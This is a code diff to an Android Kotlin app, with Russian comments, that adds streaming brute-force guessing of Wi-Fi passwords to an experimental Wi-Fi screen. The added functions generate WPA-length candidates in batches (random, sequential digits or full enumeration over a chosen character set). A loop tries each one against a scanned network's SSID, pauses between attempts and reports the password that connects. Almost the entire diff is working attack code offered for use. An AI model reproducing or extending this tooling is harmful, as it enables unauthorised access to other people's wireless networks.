@@ -57,6 +57,8 @@ import androidx.compose.material3.Text
 import androidx.compose.material3.TextButton
 import androidx.compose.runtime.Composable
 import androidx.compose.runtime.DisposableEffect
+import androidx.compose.runtime.LaunchedEffect
+import androidx.compose.runtime.MutableState
 import androidx.compose.runtime.getValue
 import androidx.compose.runtime.mutableIntStateOf
 import androidx.compose.runtime.mutableStateOf
@@ -97,6 +99,8 @@ private const val WPA_PSK_MAX_LEN = 63
 private const val GEN_LENGTH_MIN = 3
 private const val GEN_LENGTH_MAX = 80
 private const val GEN_RANDOM_MAX_BATCH = 1_000
+/** Пакет для автоподбора с пошаговой генерацией. */
+private const val GEN_STREAM_BATCH = 100
 private const val GEN_SEQUENTIAL_MAX_STEPS = 100_000
 private const val GEN_FULL_ENUM_MAX = 200_000
 
@@ -119,6 +123,16 @@ private enum class WifiPasswordGenMode {
     SEQUENTIAL_DIGITS,
     FULL_ENUMERATION,
 }
+
+private data class StreamingGenConfig(
+    val mode: WifiPasswordGenMode,
+    val charset: CharArray,
+    val effLen: Int,
+    /** Для SEQUENTIAL_DIGITS: число шагов (индексы 0..steps-1), как в поле «Сколько шагов». */
+    val sequentialSteps: Int,
+    /** Для FULL_ENUMERATION: заранее посчитанное число комбинаций. */
+    val fullEnumTotal: Long,
+)
 
 private fun buildWifiCharset(
     digits: Boolean,
@@ -193,6 +207,55 @@ private fun generateFullEnumeration(charset: CharArray, length: Int): List<Strin
         n++
     }
     return out
+}
+
+/** Следующие [batchSize] последовательных цифровых паролей; [nextIndex] — индекс после последнего. */
+private fun sequentialDigitBatch(
+    length: Int,
+    startInclusive: Long,
+    batchSize: Int,
+    capExclusive: Long,
+): Pair<List<String>, Long> {
+    val out = ArrayList<String>(batchSize)
+    var i = startInclusive
+    while (out.size < batchSize && i < capExclusive) {
+        val s = i.toString().padStart(length, '0')
+        val pwd = if (s.length <= length) s else s.substring(s.length - length)
+        out.add(pwd)
+        i++
+    }
+    return out to i
+}
+
+/** Фрагмент полного перечисления с индекса [startInclusive]. */
+private fun fullEnumerationBatch(
+    charset: CharArray,
+    length: Int,
+    startInclusive: Long,
+    batchSize: Int,
+    totalExclusive: Long,
+): Pair<List<String>, Long> {
+    if (startInclusive >= totalExclusive) return emptyList<String>() to startInclusive
+    val base = charset.size
+    val out = ArrayList<String>(
+        minOf(batchSize, (totalExclusive - startInclusive).toInt().coerceAtLeast(0)),
+    )
+    var n = startInclusive
+    var produced = 0
+    while (produced < batchSize && n < totalExclusive) {
+        var x = n
+        out.add(
+            buildString(length) {
+                for (pos in length - 1 downTo 0) {
+                    append(charset[(x % base).toInt()])
+                    x /= base.toLong()
+                }
+            },
+        )
+        n++
+        produced++
+    }
+    return out to n
 }
 
 private enum class WifiApSecurity {
@@ -583,6 +646,10 @@ fun ExperimentWifiScreen(onBack: () -> Unit) {
     var scanning by remember { mutableStateOf(false) }
 
     var pickedScan by remember { mutableStateOf<ScanResult?>(null) }
+    val candidateLinesState = remember { mutableStateOf("") }
+    LaunchedEffect(pickedScan?.BSSID) {
+        candidateLinesState.value = ""
+    }
     var pendingWifiConnect by remember {
         mutableStateOf<Pair<ConnectivityManager, ConnectivityManager.NetworkCallback>?>(null)
     }
@@ -672,6 +739,7 @@ fun ExperimentWifiScreen(onBack: () -> Unit) {
         WifiConnectDialog(
             scan = scan,
             wifiApisReady = canUseWifiApis,
+            candidateLinesState = candidateLinesState,
             onDismiss = { pickedScan = null },
             onConnect = { manualSsid, password ->
                 pickedScan = null
@@ -765,6 +833,118 @@ fun ExperimentWifiScreen(onBack: () -> Unit) {
                                 appContext.getString(R.string.experiment_wifi_brute_fail),
                                 Toast.LENGTH_LONG,
                             ).show()
+                        }
+                    } catch (_: CancellationException) {
+                        clearPendingWifiConnect(pendingWifiConnect)
+                        pendingWifiConnect = null
+                        Toast.makeText(
+                            appContext,
+                            appContext.getString(R.string.experiment_wifi_brute_cancelled),
+                            Toast.LENGTH_SHORT,
+                        ).show()
+                    } finally {
+                        bruteProgress = null
+                        bruteJob = null
+                    }
+                }
+            },
+            onStreamingGenBrute = streamingGen@{ scanForJob, manualSsid, config ->
+                if (!canUseWifiApis) {
+                    Toast.makeText(
+                        appContext,
+                        appContext.getString(R.string.experiment_wifi_connect_need_permissions),
+                        Toast.LENGTH_LONG,
+                    ).show()
+                    return@streamingGen
+                }
+                bruteFoundPassword = null
+                bruteJob?.cancel()
+                bruteJob = scope.launch {
+                    val queue = candidateLinesState.value.lines()
+                        .map { it.trim() }
+                        .filter { it.length in WPA_PSK_MIN_LEN..WPA_PSK_MAX_LEN }
+                        .distinct()
+                        .toMutableList()
+                    fun syncListUi() {
+                        candidateLinesState.value = queue.joinToString("\n")
+                    }
+                    syncListUi()
+                    var seqPos = 0L
+                    var fullPos = 0L
+                    val batch = GEN_STREAM_BATCH
+                    val seqCap = config.sequentialSteps.toLong()
+                    val fullTotal = config.fullEnumTotal
+                    try {
+                        while (isActive) {
+                            if (queue.isEmpty()) {
+                                val nextChunk: List<String> = when (config.mode) {
+                                    WifiPasswordGenMode.RANDOM -> {
+                                        generateRandomWifiPasswords(
+                                            config.charset,
+                                            config.effLen,
+                                            batch,
+                                        ).filter { it.length in WPA_PSK_MIN_LEN..WPA_PSK_MAX_LEN }
+                                    }
+                                    WifiPasswordGenMode.SEQUENTIAL_DIGITS -> {
+                                        val (chunk, next) = sequentialDigitBatch(
+                                            config.effLen,
+                                            seqPos,
+                                            batch,
+                                            seqCap,
+                                        )
+                                        seqPos = next
+                                        chunk
+                                    }
+                                    WifiPasswordGenMode.FULL_ENUMERATION -> {
+                                        val (chunk, next) = fullEnumerationBatch(
+                                            config.charset,
+                                            config.effLen,
+                                            fullPos,
+                                            batch,
+                                            fullTotal,
+                                        )
+                                        fullPos = next
+                                        chunk
+                                    }
+                                }
+                                if (nextChunk.isEmpty()) {
+                                    if (isActive) {
+                                        Toast.makeText(
+                                            appContext,
+                                            appContext.getString(R.string.experiment_wifi_brute_fail),
+                                            Toast.LENGTH_LONG,
+                                        ).show()
+                                    }
+                                    break
+                                }
+                                queue.addAll(nextChunk)
+                                syncListUi()
+                            }
+                            val pwd = queue.first()
+                            bruteProgress = BruteProgressState(
+                                currentPassword = pwd,
+                                remainingInList = queue.size,
+                                initialTotal = maxOf(queue.size, GEN_STREAM_BATCH),
+                            )
+                            clearPendingWifiConnect(pendingWifiConnect)
+                            pendingWifiConnect = null
+                            val attempt = tryWifiPassword(appContext, scanForJob, manualSsid, pwd)
+                            if (attempt.ok && attempt.handle != null) {
+                                pendingWifiConnect = attempt.handle.cm to attempt.handle.cb
+                                bruteProgress = null
+                                bruteFoundPassword = pwd
+                                Toast.makeText(
+                                    appContext,
+                                    appContext.getString(R.string.experiment_wifi_status_ok),
+                                    Toast.LENGTH_LONG,
+                                ).show()
+                                return@launch
+                            }
+                            queue.removeAt(0)
+                            syncListUi()
+                            if (queue.isNotEmpty()) {
+                                delay(BRUTE_DELAY_MS)
+                            }
                         }
                     } catch (_: CancellationException) {
                         clearPendingWifiConnect(pendingWifiConnect)
@@ -997,14 +1177,15 @@ private fun wifiChannelFromFrequencyMhz(frequency: Int): String {
 private fun WifiConnectDialog(
     scan: ScanResult,
     wifiApisReady: Boolean,
+    candidateLinesState: MutableState<String>,
     onDismiss: () -> Unit,
     onConnect: (manualSsid: String, password: String) -> Unit,
     onBruteForce: (manualSsid: String, passwords: List<String>) -> Unit,
+    onStreamingGenBrute: (scan: ScanResult, manualSsid: String, config: StreamingGenConfig) -> Unit,
 ) {
     val security = remember(scan) { scan.apSecurity() }
     var password by remember(scan) { mutableStateOf("") }
     var manualSsid by remember(scan) { mutableStateOf("") }
-    var candidateLines by remember(scan) { mutableStateOf("") }
     var fieldError by remember(scan) { mutableStateOf<String?>(null) }
 
     var genDigit by remember(scan) { mutableStateOf(true) }
@@ -1027,6 +1208,7 @@ private fun WifiConnectDialog(
     val genInvalidCount = stringResource(R.string.experiment_wifi_gen_invalid_count)
     val scroll = rememberScrollState()
     val needPermHint = stringResource(R.string.experiment_wifi_connect_need_permissions)
+    val streamNeedLen = stringResource(R.string.experiment_wifi_stream_need_wpa_len)
 
     AlertDialog(
         onDismissRequest = onDismiss,
@@ -1221,12 +1403,12 @@ private fun WifiConnectDialog(
                                     fieldError = bruteNoCandidates
                                     return@OutlinedButton
                                 }
-                                val existing = candidateLines.lines()
+                                val existing = candidateLinesState.value.lines()
                                     .map { it.trim() }
                                     .filter { it.isNotEmpty() }
                                     .toMutableSet()
                                 for (p in generated) existing.add(p)
-                                candidateLines = existing.joinToString("\n")
+                                candidateLinesState.value = existing.joinToString("\n")
                             },
                             modifier = Modifier.fillMaxWidth(),
                         ) {
@@ -1239,8 +1421,8 @@ private fun WifiConnectDialog(
                         )
                         Spacer(Modifier.height(8.dp))
                         OutlinedTextField(
-                            value = candidateLines,
-                            onValueChange = { candidateLines = it; fieldError = null },
+                            value = candidateLinesState.value,
+                            onValueChange = { candidateLinesState.value = it; fieldError = null },
                             label = { Text(stringResource(R.string.experiment_wifi_brute_list_hint)) },
                             minLines = 4,
                             maxLines = 8,
@@ -1258,7 +1440,7 @@ private fun WifiConnectDialog(
                                     fieldError = errSsidRequired
                                     return@OutlinedButton
                                 }
-                                val list = candidateLines.lines()
+                                val list = candidateLinesState.value.lines()
                                     .map { it.trim() }
                                     .filter { it.length in WPA_PSK_MIN_LEN..WPA_PSK_MAX_LEN }
                                     .distinct()
@@ -1275,6 +1457,81 @@ private fun WifiConnectDialog(
                             modifier = Modifier.fillMaxWidth(),
                         ) {
                             Text(stringResource(R.string.experiment_wifi_brute_run))
+                        }
+                        Spacer(Modifier.height(8.dp))
+                        OutlinedButton(
+                            onClick = {
+                                fieldError = null
+                                if (!wifiApisReady) {
+                                    fieldError = needPermHint
+                                    return@OutlinedButton
+                                }
+                                if (scan.displaySsid().isBlank() && manualSsid.isBlank()) {
+                                    fieldError = errSsidRequired
+                                    return@OutlinedButton
+                                }
+                                val effLen = effectiveWpaGenLength(genLen)
+                                if (effLen < WPA_PSK_MIN_LEN) {
+                                    fieldError = streamNeedLen
+                                    return@OutlinedButton
+                                }
+                                val charset = buildWifiCharset(genDigit, genLower, genUpper, genSpecial)
+                                if (charset.isEmpty()) {
+                                    fieldError = genCharsetEmpty
+                                    return@OutlinedButton
+                                }
+                                val cfg: StreamingGenConfig = when (genMode) {
+                                    WifiPasswordGenMode.RANDOM -> {
+                                        StreamingGenConfig(
+                                            mode = genMode,
+                                            charset = charset,
+                                            effLen = effLen,
+                                            sequentialSteps = 0,
+                                            fullEnumTotal = 0L,
+                                        )
+                                    }
+                                    WifiPasswordGenMode.SEQUENTIAL_DIGITS -> {
+                                        if (!genDigit || genLower || genUpper || genSpecial) {
+                                            fieldError = genSeqDigitsOnly
+                                            return@OutlinedButton
+                                        }
+                                        val steps = genSeqSteps.toIntOrNull()?.coerceIn(1, GEN_SEQUENTIAL_MAX_STEPS)
+                                        if (steps == null) {
+                                            fieldError = genInvalidCount
+                                            return@OutlinedButton
+                                        }
+                                        StreamingGenConfig(
+                                            mode = genMode,
+                                            charset = charset,
+                                            effLen = effLen,
+                                            sequentialSteps = steps,
+                                            fullEnumTotal = 0L,
+                                        )
+                                    }
+                                    WifiPasswordGenMode.FULL_ENUMERATION -> {
+                                        val cnt = fullEnumerationCount(charset.size, effLen)
+                                        if (cnt > GEN_FULL_ENUM_MAX) {
+                                            fieldError = genFullTooLarge
+                                            return@OutlinedButton
+                                        }
+                                        if (cnt == 0L) {
+                                            fieldError = bruteNoCandidates
+                                            return@OutlinedButton
+                                        }
+                                        StreamingGenConfig(
+                                            mode = genMode,
+                                            charset = charset,
+                                            effLen = effLen,
+                                            sequentialSteps = 0,
+                                            fullEnumTotal = cnt,
+                                        )
+                                    }
+                                }
+                                onStreamingGenBrute(scan, manualSsid, cfg)
+                            },
+                            modifier = Modifier.fillMaxWidth(),
+                        ) {
+                            Text(stringResource(R.string.experiment_wifi_stream_brute_run))
                         }
                     }
                 }
